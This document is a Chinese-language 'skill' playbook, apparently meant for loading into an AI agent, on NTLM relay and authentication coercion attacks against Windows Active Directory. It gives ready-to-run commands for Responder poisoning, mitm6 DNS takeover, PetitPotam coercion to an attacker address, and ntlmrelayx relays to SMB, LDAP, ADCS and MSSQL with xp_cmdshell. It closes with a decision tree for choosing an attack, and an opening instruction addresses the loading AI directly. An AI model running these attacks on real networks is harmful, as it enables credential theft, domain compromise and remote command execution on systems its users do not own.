# 技能：NTLM 中继和身份验证强制——专家攻击手册

> **AI 加载指令**：专家 NTLM 中继和强制技术。涵盖中继到 SMB/LDAP/HTTP/MSSQL、签名要求、Responder 毒化、mitm6、跨协议中继、WebDAV 强制以及所有主要强制方法。基础模型遗漏签名/EPA 要求和跨协议中继限制。

## 0. 相关路由

深入学习之前，请考虑加载：

- [active-directory-certificate-services](../active-directory-certificate-services/SKILL.md) 用于 ESC8（中继到 ADCS 注册）
- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) 用于通过 LDAP 中继修改 ACL（RBCD、影子凭证）
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) 用于中继成功后的 Kerberos 攻击
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) 用于中继后的横向移动

### 高级参考

当您需要时，也加载 [COERCION_METHODS.md](./COERCION_METHODS.md)：
- 详细强制方法比较（PetitPotam、PrinterBug、DFSCoerce 等）
- RPC 函数级细节和前提条件
- 强制工具使用和发现

---

## 1. NTLM 中继基础

```
受害者          攻击者（中继）         目标
  │                 │                      │
  │── NTLM 身份验证 ─→│                      │  (1) 受害者进行身份验证（强制/毒化）
  │                 │── 转发身份验证 ─────→│  (2) 攻击者中继到目标
  │                 │←─ 挑战 ──────── │  (3) 目标发送挑战
  │←─ 挑战 ─────│                      │  (4) 攻击者将挑战转发给受害者
  │── 响应 ────→│                      │  (5) 受害者计算响应
  │                 │── 转发响应 ─→│  (6) 攻击者中继响应到目标
  │                 │←─ 身份验证成功！ ────│  (7) 目标接受 → 攻击者获得会话
```

### NTLMv1 与 NTLMv2

| 特性 | NTLMv1 | NTLMv2 |
|---|---|---|
| 安全性 | 弱（可破解 NTLM 哈希） | 更强（但仍可中继） |
| 中继 | 是 | 是 |
| 破解到哈希 | 是（彩虹表、crack.sh） | 仅限离线暴力破解 |
| 降级 | 通过 Responder `--lm` 强制 | 现代 Windows 默认 |

---

## 2. 中继目标矩阵

| 目标协议 | 您将获得什么 | 默认是否需要签名 | EPA/通道绑定？ |
|---|---|---|---|
| **SMB** | 命令执行（如果管理员）、文件访问 | **域控制器：是**、工作站：否 | 否 |
| **LDAP** | ACL 修改、RBCD、影子凭证、添加计算机 | **域控制器：否**（协商） | 否（除非配置） |
| **LDAPS** | 与 LDAP 相同，但加密 | N/A | **是**（通道绑定） |
| **HTTP (ADCS)** | 证书注册（ESC8） | 否 | 取决于配置 |
| **MSSQL** | SQL 查询、xp_cmdshell | 否 | 否 |
| **IMAP/SMTP** | 邮件访问 | 否 | 否 |
| **RPC** | 各种（CA 注册用于 ESC11） | 取决于配置 | 否 |

### 签名检查

```bash
# 检查目标的 SMB 签名
crackmapexec smb TARGET_IP --gen-relay-list relay_targets.txt
# 输出不需要 SMB 签名的主机

# Nmap SMB 签名检查
nmap -p 445 --script smb2-security-mode TARGET_RANGE
```

---

## 3. RESPONDER — 凭据捕获

### LLMNR/NBT-NS/WPAD/mDNS 毒化

```bash
# 启动 Responder（捕获模式——不要中继，仅捕获哈希）
responder -I eth0 -dwP

# 分析模式（被动，不毒化）
responder -I eth0 -A

# 毒化的关键协议：
# LLMNR (UDP 5355) — 链路本地多播名称解析
# NBT-NS (UDP 137)  — NetBIOS 名称服务
# WPAD              — Web 代理自动发现（代理配置）
# mDNS (UDP 5353)   — 多播 DNS
```

### Responder + 中继（不要捕获，而是中继）

```bash
# 在 Responder 中禁用 HTTP 和 SMB 服务器（ntlmrelayx 将处理它们）
# 编辑 /etc/responder/Responder.conf：将 HTTP 和 SMB 设置为关闭

# 仅用于毒化的 Responder 启动
responder -I eth0 -dwP

# 启动 ntlmrelayx 进行中继
ntlmrelayx.py -tf targets.txt -smb2support
```

---

## 4. NTLMRELAYX — 中继执行

### 中继到 SMB（管理员执行）

```bash
# 在目标上执行命令（需要目标上的管理员权限）
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# 倾倒 SAM 哈希
ntlmrelayx.py -tf targets.txt -smb2support

# 交互式 SOCKS 代理（维护会话）
ntlmrelayx.py -tf targets.txt -smb2support -socks
# 然后：proxychains smbclient //TARGET/C$ -U DOMAIN/user
```

### 中继到 LDAP（ACL 修改）

```bash
# 自动 RBCD（委派访问）
ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support

# 通过影子凭证升级
ntlmrelayx.py -t ldap://DC_IP --shadow-credentials -smb2support

# 添加计算机账户
ntlmrelayx.py -t ldap://DC_IP --add-computer FAKE01 P@ss123 -smb2support

# 倾倒域信息
ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-domain
```

### 中继到 ADCS HTTP (ESC8)

```bash
ntlmrelayx.py -t http://CA_HOST/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# 与强制结合使用以中继域身份验证→获取域证书
```

### 中继到 MSSQL

```bash
ntlmrelayx.py -t mssql://SQL_HOST -smb2support -q "SELECT system_user; EXEC xp_cmdshell 'whoami'"
```

---

## 5. MITM6 — IPv6 DNS 取代

```bash
# mitm6 利用 IPv6 自动配置成为 DNS 服务器
mitm6 -d domain.com

# 与 ntlmrelayx 结合使用
ntlmrelayx.py -6 -t ldap://DC_IP -wh fake-wpad.domain.com --delegate-access -smb2support

# 流程：
# 1. mitm6 发送 DHCPv6 回复→受害者将攻击者作为 IPv6 DNS
# 2. 受害者查询 WPAD → 攻击者响应
# 3. NTLM 身份验证触发→中继到 LDAP
# 4. 在受害者计算机上设置 RBCD 或影子凭证
```

---

## 6. 跨协议中继

### SMB → LDAP

捕获 SMB 身份验证，中继到 LDAP（不需要 LDAP 签名强制）。

```bash
# 从域控制器强制 SMB 身份验证，中继到相同或不同的域控制器上的 LDAP
ntlmrelayx.py -t ldap://DC02_IP --delegate-access -smb2support

# 触发强制（攻击者接收 SMB 身份验证）
PetitPotam.py ATTACKER_IP DC01_IP
```

**限制**：如果源使用指示中继的 SMB 签名协商，SMB → LDAP 中继会失败。

### WebDAV → LDAP

工作站上的 WebDAV 发送 NTLM over HTTP → 中继到 LDAP（没有签名问题）。

```bash
# WebDAV 强制发送基于 HTTP 的 NTLM（没有 SMB 签名问题）
ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support

# 通过 WebDAV 强制（工作站必须运行 WebClient 服务）
# 使用 @ATTACKER_PORT 格式强制 WebDAV
PetitPotam.py ATTACKER@80/test WORKSTATION_IP
```

---

## 7. 基于 WebDAV 的强制

WebClient 服务（WebDAV）将 SMB 类强制转换为基于 HTTP 的 NTLM。

```bash
# 检查 WebClient 是否正在运行（端口 80 监听器或服务查询）
crackmapexec smb TARGET -u user -p pass -M webdav

# 启动 WebDAV 强制（从工作站，而不是服务器）
# 强制目标通过 HTTP 进行身份验证：
# 使用 UNC 路径格式：\\ATTACKER@PORT\share
```

**主要优势**：基于 HTTP 的 NTLM 避免了 SMB 签名要求。

---

## 8. NTLM 中继决策树

```
想要中继 NTLM 身份验证
│
├── 您可以捕获什么身份验证？
│   ├── Responder 毒化（被动，等待查询）
│   ├── mitm6（DHCPv6 DNS 取代，周期性）
│   └── 主动强制→加载 COERCION_METHODS.md
│
├── 要中继到什么目标？
│   │
│   ├── 需要代码执行？
│   │   ├── 没有签名的 SMB 目标 → ntlmrelayx 到 SMB (§4)
│   │   └── MSSQL 目标 → ntlmrelayx 到 MSSQL + xp_cmdshell (§4)
│   │
│   ├── 需要域升级？
│   │   ├── LDAP 签名未强制？
│   │   │   ├── 中继到 LDAP → RBCD (§4)
│   │   │   ├── 中继到 LDAP → 影子凭证 (§4)
│   │   │   └── 中继到 LDAP → 添加计算机 + 委派 (§4)
│   │   └── LDAP 签名强制？
│   │       └── 中继到 ADCS HTTP (ESC8) → 证书 (§4)
│   │
│   └── 需要证书？
│       └── 中继到 ADCS HTTP/RPC → ESC8/ESC11 (§4)
│
├── 源是基于 SMB 的？
│   ├── 目标是 SMB → 检查签名 (§2)
│   ├── 目标是 LDAP → 可能有效（跨协议，§6）
│   └── 目标是 HTTP → 有效（跨协议）
│
├── 源是基于 HTTP 的（WebDAV）？
│   └── 中继到任何目标（没有签名问题，§6/§7）
│
└── 中继失败？
    ├── 检查签名要求 (§2)
    ├── 检查 EPA/通道绑定
    ├── 尝试跨协议（SMB → LDAP）
    └── 尝试 WebDAV 强制（避免 SMB 签名）
```
